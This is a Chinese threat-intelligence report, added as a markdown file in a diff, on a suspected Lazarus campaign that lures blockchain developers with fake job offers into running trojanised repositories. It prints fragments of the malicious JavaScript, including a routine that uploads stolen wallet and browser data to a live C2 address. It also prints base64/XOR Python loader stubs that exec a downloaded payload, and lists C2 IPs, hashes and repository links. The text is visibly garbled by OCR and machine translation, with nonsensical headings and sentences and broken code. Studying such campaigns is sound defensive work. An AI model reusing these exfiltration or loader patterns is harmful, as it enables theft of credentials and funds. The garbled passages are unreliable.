@@ -1,0 +1,263 @@
+# 针对区块链从业者的招聘陷阱：疑似Lazarus（APT-Q-1）窃密行动分析  
+
+原创威胁情报中心奇安信威胁情报中心2024-05-1015:10北京  
+
+## I团伙背景  
+
+Lazarus 疑似具有东北亚背景的 APT 组织，奇安信内部跟踪编号 APT-Q-1。该组织因2014年攻击索尼影业开始受到广泛关注，其攻击活动最早可追溯到2007年。Lazarus早期主要针对政府机构，以窃取敏感情报为目的，但自2014年后，开始攻击全球金融机构、虚拟货币交易场所等目标，从受害者处盗取金钱资产。Lazarus曾多次利用虚假的社交账号，提供工作机会为伪装，向特定行业人员发起钓鱼攻击。  
+
+## I事件概述  
+
+[1 -4]近期多名安全研究人员发现一类非法JS代码的ZIP压缩包 ，样本涉及的非法软件与去[5]年11月国外Unit 42团队披露的"传染性访谈"攻击活动”一致。  
+
+经过进一步调查，奇安信威胁情报中心发现，攻击者在去攻击年底被披露后仍关闭展开攻击行动，受害者主要是区块链行业的开发者。这些人在工作平台（比如Linkedln、Upwork、Braintrust等））上塑造形象的身份，伪装为雇主、独立开发者或斯科特公司创始人，发布具有慈善事业或者紧急任务的工作信息，工作内容通常是软件开发或者问题修复。这些工作信息会吸引主动搜索而来的开发者，或者借助平台的自主机制呈现在目标面前。在讨论具体工作内容人群时，攻击者试图说服应聘人员在自己的设备上运行由他们提供的代码。一旦应聘人员不加怀疑地运行程序，其中插入的恶意JS代码将窃取感染设备上与虚拟货币相关的敏感信息，并入侵其他恶意软件。攻击流程如下所示。  
+
+  
+
+这一批攻击样本与"传染性访谈"行动所用的网络基础设施重叠，且攻击者发起网络钓鱼的手法和受害者所属行业与拉撒路组织之前的活动类似，因此此次持续进行的攻击行动可能和拉撒路组织有关。  
+
+## I详细分析  
+
+### 网络钓鱼  
+
+### 伪造的网站  
+
+提出恶意JS代码的部分攻击样本在提到的app[.]freebling.io这个域名中。  
+
+  
+
+该对应网站如下，主页自称是web3营销和奖励平台。  
+
+  
+
+[6-9]根据该域名，我们发现在数月前出现了明显的区块链行业从业者发帖称，收到与该网站相关的开发工作邀请，委派工作的客户要求他们在本地运行所提供的代码，部分应聘者的加密货币钱包因此失窃。  
+
+# 赞 评论 分享  
+
+  
+
+# EchaPSOeoen  
+
+5个月  
+
+AlBlockchain|Tech Enthusiast  
+
+thisisso truereceived thisone,andalmostdidit,theyclaimed thatthey hadurgentissuestofix,andgavemeacodewithNDA,andIfound somethingweird，thisistheirsitehttps://app.freebling.io,andwhen mentionwhyissheputchild_processonthepackage,shesuddenly disappearsfromLinkedln.  
+
+  
+
+AnastasiiaTikich   
+Activenow   
+wait,  
+
+  
+
+AnastasiiaTikich·8:31AM Okay  
+
+EchaPSOeoen(He/Him)·8:31AM whatisthis,youputchildprocess onthepackage  
+
+  
+
+### 网络钓鱼方式  
+
+对网上公开的攻击活动记录进行整理后，我们发现攻击者利用的工作信息发布平台至少[6,9,10] [7,8] [11]包括 Linkedln 、Upwork 、Braintrust  
+
+HereistheDiscordmessage:  
+
+  
+
+upwork.com/jobs/\~01fb0cbo.  
+
+As mentioned in the job post, it's an ongoing project. So, as usual, the client sent me therepoof theproject:  
+
+bitbucket.org/juandsuareza/m..  
+
+Tags". ITWorkers  
+
+# DetailsI  
+
+IwasregisteredonBraintrustasafreelancerandreceivedajobinvitationforpart-timework. Thepersonwhoinvitedmeused thename\*Bill Tinys"andprovided mewiththe jobrequirements.Healso asked metocheckoutthe codebaseandtrytoreproducetheissue thathewasfacinglocally: ·FreeBling online site:https://app.freebling.io/ Thecodebase-bitbucket.org/juandsuareza/main/src/main/ 0xc2f103ce223dae119d04892d412d3484f8dcec1f-Victim 0x8d5a2684330a6b7f791ce6acb5d4a09f53cb5f67-Theft ·0xb3c9effe909a737621b929600c6bd1e5a62f43c5-Theft ·0x8baa40851c5c3a822e9c881103573f5246ead710-Defiway,BSC,viaStargate ?0x77b737bb6c6eb4c717228aa653da2a4f994040a9-Sendsto0x8baa40851c5c3a822e9c881103573f5246ead710 ·0xbe1566497c7f581258c14bf297a8f4e747ddf013-April2024DustCollector  
+
+# DetailsI  
+
+IdofreelancesoftwaredevelopmentworkthroughthecompanyBraintrust(www.usebraintrust.com). Braintrustisalegitimateservicethatconnectsclientswithfreelancesoftwaredevelopersandhandlescommunication,contracts,and payments/billing.  
+
+攻击者以伪装身份与吸引来访的应聘人员进行沟通，向应聘人员提出详细的项目设计和需求，增加伪装身份的说服力，并通过一系列社会工程学手段诱使应聘人员在本地运行攻击者提供的代码，具体方式包括：  
+
+（1）假设是编码挑战，为了测试应聘者的技能是否满足工作要求;  
+(2)声称项目代码存在问题需要修复，让应聘者运行程序是否能修复问题。  
+
+### 恶意代码托管  
+
+攻击者通过代码托管平台搭建包含恶意代码的架构，聘用供应商下载，使用的代码托管平台包括Github，GitLab和Bitbucket。  
+
+与攻击活动有关的Github账号如下，部分Github账号有多年的活动记录，看起来与普通账号无异。  
+
+<html><body><table><tr><td>Github账号</td><td>说明</td></tr><tr><td>https://github.com/plannet-plannet/</td><td>账号删除</td></tr><tr><td>https://github.com/bmstoreJ/</td><td>账号删除</td></tr><tr><td>https://github.com/CodePapaya/</td><td>账号删除</td></tr><tr><td>https://github.com/Allgoritex/</td><td>账号删除</td></tr><tr><td>https://github.com/bohinskamariia/</td><td>账号删除</td></tr><tr><td>https://github.com/danil33110/</td><td>账号删除</td></tr><tr><td>https://github.com/aluxiontemp/</td><td>账号删除</td></tr><tr><td>https://github.com/komeq1120/</td><td>账号删除</td></tr><tr><td>https://github.com/aufeine/ https://github.com/dhayaprabhu/</td><td>账号自2024-04-15开始活动</td></tr><tr><td></td><td>账号自2019年开始活动 恶意代码库（dhayaprabhu/Crypto-Node.js）于2024-0 2-01首次提交</td></tr><tr><td>https://github.com/MatheeshaMe/</td><td>账号自2021年开始活动 恶意代码库（MatheeshaMe/etczunks-marketplace） 于2023-10-11提交</td></tr><tr><td>https://github.com/Satyam-G5/</td><td>账号自2023年开始活动 恶意代码库（Satyam-G5/etczunks-marketplace）于2 023-10-12 Fork 自 MatheeshaMe/etczunks-marketplace</td></tr><tr><td>https://github.com/emadmohd211/</td><td>账号自2021年开始活动</td></tr></table></body></html>  
+
+<html><body><table><tr><td>https://github.com/alifarabi/</td><td>账号自2020年开始活动 恶意代码库（alifarabi/organ-management）于2024-0 3-30首次提交</td></tr></table></body></html>  
+
+GitLab 的恶意代码库如下，涉及两个账号：Adrian John（@cleverpan43）和NYYU「O( $@$ aminengineerings)。  
+
+<html><body><table><tr><td>GitLab库链接</td><td>GitLab账号</td></tr><tr><td>https://gitlab.com/crypto-trading5202718/trading-initial-project https://gitlab.com/e-commerce-platform1/e-commerce-hdemo8811</td><td rowspan="3">https://gitlab.com/clever pan43</td></tr><tr><td>https://gitlab.com/nft-marketplace-platform/nft_wallet_hirdemo80 0118</td></tr><tr><td>https://gitlab.com/initial-card-game-demo/2d_card_game_demo_k</td></tr><tr><td>mug0801 https://gitlab.com/benhermas/bh-vp-beta</td><td rowspan="3">https://gitlab.com/aminee ngineerings</td></tr><tr><td>https://gitlab.com/benhermas/bh-cryptoweb-beta</td></tr><tr><td>https://gitlab.com/ndbtechnology/ndb-school-15121-express-react https://gitlab.com/ndbtechnology/ndb-school-15120-express-react</td></tr></table></body></html>  
+
+  
+
+  
+
+Bitbucket存放的恶意代码库如下，代码库链接来自回顾freebling网站的攻击活动记录-9]  
+
+#### Bitbucket库  
+
+https://bitbucket.org/juandsuareza/main/src/main/ https://bitbucket.org/freebling/landing-web-app/src/main/  
+
+  
+
+### 恶意软件  
+
+攻击者使用的恶意软件与双方披露的"传染性访谈"攻击活动一致，这里只进行简单的说明。  
+
+应聘者下载的某个文件中潜藏有恶意JavaScript代码，入门者的恶意代码放置在一行之内，攻击者通常在前面加上单行注释和一长串空白符，如果文本编辑器未使用换行模式，将很难发现恶意代码的存在。  
+
+  
+针对区块链从业者的招聘陷阱：疑似Lazarus（APT-Q-1）窃密行动分析  
+
+#### JavaScript恶意代码  
+
+JS代码通过Base64编码和字符串切分对关键字符串进行保护。  
+
+  
+
+以样本（MD5:97868b884fc9d01c0cb1f3fa4d80b09f）为例进行分析，其中做出的恶意JS代码会重复运行主函数nt多次。  
+
+  
+
+主函数首先收集Windows、Linux、macOs平台上多款浏览器的敏感信息，尤其是加密货币钱包相关的浏览器插件数据。  
+
+  
+
+<html><body><table><tr><td>平台</td><td>收集的信息</td></tr><tr><td>视窗</td><td>Chrome、Brave、Opera、Edge浏览器的加密货币钱包插件信息</td></tr><tr><td>Linux</td><td>Chrome、Brave、Opera浏览器的加密货币钱包插件信息; “~/.local/share/keyrings/”目录下的文件; Chrome、Firefox浏览器保存的密码数据。</td></tr><tr><td>苹果系统</td><td>Chrome、Brave、Opera浏览器的加密货币钱包插件信息； login.keychain和login.keychain-db文件;</td></tr></table></body></html>  
+
+Chrome、Brave、Firefox浏览器保存的密码数据。  
+
+将收集的敏感信息回传到C2服务器(147[.]124.214.237:1244)，回传信息的URL为"/uplOads"。  
+
+115 S=t=>{//该函数向C2回传收集的数据  
+116 constc='multi_file',a=/uploads'  
+117 \$={timestamp:e.toString(）,type:h,hid:k,[c]:t],  
+118 s=1(）;  
+119 try{  
+120 constt={['url']:\${s}\$[a],['formData']:\$};//http://147.124.214.237:1244/uploads  
+121 rq[L]（t,（t,c,a)=>[);  
+122 }catch （t)  
+123  
+
+从C2服务器的"/clients/"下载后续Python脚本并运行。Linux和macOS平台直接调用python3命令执行；而在Windows平台上会先检查"%HOME%\.pyp\\python.exe"是否存在，如果不存在，则从"/pdown"下载包含Python运行环境的ZIP压缩包，并解压到%HOM$\mathsf{E\%}$ 目录。  
+
+  
+
+#### Python恶意代码  
+
+从"/clients/"下载的Python脚本解密补充然后执行。其中sType标记为campaign_id的值，如果下载URL中的campaign_id省略，sType值则为"default"，因为会因此sType值的不同导致下载得到的Python脚本hash值发生变化。  
+
+sType='NVRLYWO5' 3 t="GlmY"+"ksYL"+"TQUAKQQBLWwLDR48XUd1PCsNGT8EATRgKB9BKh4RKT4oDwgqGF8qNTRmGSsSSTAhNwMfLUsBP 4 importbase64 5 d=base64.b64decode(t[8:]);sk=t[:8];size=len(d);res= 6 foriin range(size):k=i&7;c=chr(d[i]ord(sk[k]));res+=c exec(res) 8  
+
+该下载脚本其他的两个脚本并执行：  
+
+·从C2服务器的"/payload/"下载脚本，保存为"%HOME%/.n2/pay";·如果运行平台不是macOS，从C2服务器的"/brow/"下载脚本，保存为"%HOME%/.n2/bow"。  
+
+  
+
+Bow脚本同样支持Windows、Linux、macOS三个平台，为了进一步获取多款浏览器的数据，将其发送回C2的"/keys"URL。  
+
+  
+
+Pay脚本包含两部分内容。第一部分用于收集设备信息，包括用户名、操作系统版本、IP和断层，同样发送回C2的"/keys"URL。  
+
+sType='NVRLYWO5' t="w4Ix"+"UULD"+"HLk5FychbCYWRyxOYXk/KxRfLAxfMz4rGhQ8DTwxbCOaRCYKIXUrIQNaJhwwXyo2GFLpCjAkOSEEQDpYPDg8K importbase64 d=base64.b64decode(t[8:]);sk=t[:8];size=len(d);res= foriinrange(size):k=i&7;c=chr(d[i]^ord(sk[k]));res+=c exec(res) 8 t="NwOU"+"NQQS"+"JxpA0jwlcTEvBFVjenOhPy8DVjo8PHOgIRRbMDpbNyEhGhAhJzw0cycaQDo8JXEgIhJVJUQ3IzwjVeM6LTo0J2 9 d=base64.b64decode(t[8:]);sk=t[:8];size=len(d);res= 10 for1inrange(size):k=i&7;c=chr(d[1]ord(sk[k]));res+=c 1 exec(res) 12  
+
+第二部分为Python木马，C2为45[.]61.131.218:1245，木马指令和之前报告的披露一致。其中一个指令ssh_any会从第一阶段C2服务器(147[.]124.214.237:1244)的"/adc/"URL下载用于配置AnyDesk的Python脚本。  
+
+  
+
+## I溯源关联  
+
+在攻击活动所用恶意软件与Unit42披露的BeaverTail和lnvisibleFerret一致，关联样本(MD5:51494dc0c88cc2d8733dd82c2e63e0d6） 使用的C2服务器172[.]86.123.35:1244同样出现在相应活动中，这里针对区块链行业的钓鱼攻击是"传染性采访"活动的褒奖。  
+
+DomainandIPsassociatedwiththeContagiousInterviewcampaign:  
+
+blocktestingto[.]com   
+144.172.74[.]48   
+144.172.79[.]23   
+167.88.168[.]152   
+167.88.168[.]24   
+172.86.123[.]35   
+45.61.129[.]255   
+45.61.130[.]0   
+45.61.160[.]14   
+45.61.169[.]187  
+
+Lazarus组织曾利用Linkedln平台扮演雇主身份，以编码挑战为理由诱使应聘者执行恶意[12]代码，利用钓鱼手段和本次活动存在相似之处，且加密货币和区块链行业一直都是拉撒路恐怖袭击的领域，因此我们认为此次大规模钓鱼攻击可能与拉撒路组织有关。  
+
+## I总结  
+
+攻击者为了达到窃取加密货币的目的，选择将目光投向区块链行业的技术人员，通过扭曲网络身份，以工作招聘为幌子吸引目标群体。由于这一领域的远程开发工作十分常见，再加上攻击者事先准备好的网站和设计文档以增加可信度，使得很难正常的工作区域分开来。一旦应聘者不加提防地按照攻击者要求在自己的设备上运行正常的代码，将落入陷阱，造成财产损失和敏感数据泄露。  
+
+## I防护建议  
+
+奇安信威胁情报中心提醒广大用户，谨防钓鱼攻击，打开社交媒体分享的来历不明的链接，不点击执行未知来源的邮件附件，不运行标题夸张的未知文件，不安装非正规途径来源的APP。做到及时备份重要文件，更新安装补丁。  
+
+若需运行，安装来历不明的应用，可先通过奇安信威胁情报文件深度分析平台（https://sandbox.ti.qianxin.com/sandbox/page）进行判别的。目前已支持包括Windows、Android平台在内部的多种格式文件深度分析。  
+
+目前，基于奇安信威胁情报中心的威胁情报数据的全线产品，包括奇安信威胁情报平台（TIP）、天擎、天眼高级威胁检测系统、奇安信NGSOC、奇安信威胁情报等，都已经支持了这一点类攻击的准确检测。  
+
+## I国际奥委会  
+
+MD5  
+
+(JavaScript) 0f229f0929c081cab93f8276e29fe11b 7624fc8b47cb58444ff0176edd7f15cb 7859ef9ca6f7fa800a058d3586164672 4120ce03d7d662d5ddf10e4565495055 560a2438bea7a7421b92f66b4d7c756b 1ca6bcea09b3b9b3cb338faf8161b7e8 ac55b61572eb8424192316c0970ccb54 6e5a8473832d376165906a99395ec1bd ca294d9ccb1e41dd8592cec7158590cb 770ce85b7d4658812562be93e7a5ea52 51494dc0c88cc2d8733dd82c2e63e0d6 c753611ab87bd41cdf4ff9b140440fe2 979bb789ecd5a3881ad3d4823ca8fdc1 1a7581f412ff361d82091eb5f07c27a8 804ac0a47f7bb78afa666358325629bc c1c1c5b2a76a3d463cb4f7c22c88bbe5 1e20dfc8145abced35dd934d5136e5dd 78f972104c48c25b6f5e7d3ffc2b4e1a 67d5c6db5cc292e00fdcfeb11fda9e0e b73ba1327abb95eba44a233d9d502c79 e8fcc05c328b612918b3384638873a6d 5cb77e93ebe96f22741285592cd35100 647d26e94b9be5a1237a59d0b2b38442 67cee5b180370eb03d9606f481e48f36 1822bea1d0ec9ae1db9c265386699102 ce00e20489f75fde53992bc69abe7b62 d6c5c1d4510d0fccad5e0bc1de3cf80e  
+
+# (压缩包)  
+
+c4c62c35ac06ffa843d2f84af089c94c 04e5082bdeebfbbc2aef66b17e64e2f7 d7783ba8476f1a2f0831f32abf9c3e69 1948c99104e09ecaa0f4cb3fdac276d5 2ed1b50ed4ca84c0fdde84a585fac536 48fc7c946c34771b82a5e49a93d405a6 c2d7a7460bb15b3a9c082f6d88ee0b84 dbda4a6e6741fa3d7819c3c88ed22e88 f1b78698b108fbf5bfcbb6d7f3bbad76 93b7dbf5980de29cf7fb9a610229bb5a 907f39788d1d1439eed333091fd16730 eb0ba3a1623e95e57fb5a2aedb97d45f 95362a0f440990992cc9ad04e6675e77 58db0d021b75eb2a581c7773844703b5 110a7556e2ebcca7255be1c6ee999b94 37f4c3fb5925f0e39b2c9e7e5eb4450d 53ec27df858d3d133808ec338df29fc6  
+
+7a5a694ac7d4068f580be624ece44f4ffa174cdd22080f11e13844c1e3326cd2e6d09c7ad340d10109e6781bfb05a319aad9dcd3a2045dafea47eef776ec5b8ad3a85f6ccf117fb1cdb506094eddd2231922228868dc24dfe9b067d2b3c6d1897868b884fc9d01c0cb1f3fa4d80b09f46b2cfef633e6e531928a9c606b40b16355b1bedeb19b546800de5ecc79338492a16962b336cc5296bb4e4230a5e54046ca874b098ba768ad5814bef9cf409faa07cd2703361ad566c5857a4e8e1652aebe250b7ca9122231f1d114b12d278213b5501885ba5283ec08101bc4cb9d6138e13d8b8d0c965b95408a2efdde3284731725dc195bb09fc32a842a554cc931ba6fad33175e33ab7306e879f4f022662093ea7c80ab1a192a91f4132078c02b15e5f51a859b170151714df1c5b648e31  
+
+### 指令与指令  
+
+http://172.86.97.80:1224   
+http://172.86.123.35:1244   
+http://147.124.212.89:1244   
+http://147.124.212.146:1244   
+http://147.124.213.11:1244   
+http://147.124.213.29:1244   
+http://147.124.214.129:1244   
+http://147.124.214.131:1244   
+http://147.124.214.237:1244   
+http://67.203.7.171:1244   
+http://67.203.7.245:1244   
+http://91.92.120.135:3000   
+45.61.131.218:1245   
+173.211.106.101:1245  
+
+## I参考链接  
+
+[1].https://twitter.c0m/malwrhunterteam/status/1781619431728123981   
+[2].https://twitter.c0m/dimitribest/status/1782609281897902426   
+[3].https://twitter.c0m/asdasd13asbz/status/1782951380568936481   
+[4].https://twitter.com/Ba0shengbinCumt/status/1783402882903277983   
+[5].https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actor   
+s-target-job-hunters/   
+[6].https://www.linkedin.com/posts/abhisheksinghsoni_blockchainsecurity-cryptos   
+camalert-defijobs-activity-7127542067001475073-71xU   
+[7].https://www.linkedin.com/pulse/i-got-hacked-what-did-do-after-lokicheck-zuzk   
+C   
+[8].https://twitter.c0m/syedasadkazmi/status/1769710505953026109   
+[9].https://www.linkedin.com/posts/nikhil-jain-385456190_cryptoscam-jobsecurity   
+-walletsecurity-activity-7166506226401329153-wnGJ   
+[10].https://github.com/0x50D4/0x50d4.github.io/blob/main/_posts/2024-04-03-p   
+ython-malware.md   
+[11].https://github.com/tayvano/lazarus-bluenoroff-research/blob/main/hacks-an   
+d-thefts/braintrust_job_dev_scam.md   
+[12].https://www.welivesecurity.com/en/eset-research/lazarus-luring-employees-tr   
+ojanized-coding-challenges-case-spanish-aerospace-company/  
